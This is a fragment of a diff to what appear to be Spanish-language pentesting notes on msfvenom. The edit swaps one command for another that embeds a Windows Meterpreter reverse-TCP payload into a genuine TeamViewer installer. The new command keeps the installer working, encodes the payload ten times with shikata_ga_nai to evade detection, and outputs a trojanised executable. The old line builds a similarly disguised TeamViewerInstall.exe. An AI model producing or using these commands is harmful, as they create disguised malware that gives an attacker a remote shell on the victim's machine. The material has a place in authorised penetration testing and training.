@@ -14,6 +14,6 @@ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.1
 
 ### Encoder shikata_ga_nai con interacciones
 ```python
-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe./TeamViewerInstall.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.37 LPORT=443 -x /home/kali/Downloads/TeamViewerQS_x64.exe -e x86/shikata_ga_nai -a x86 --platform windows -i 10 -k -f exe > /home/kali/Downloads/giafar.exe
 ```
 
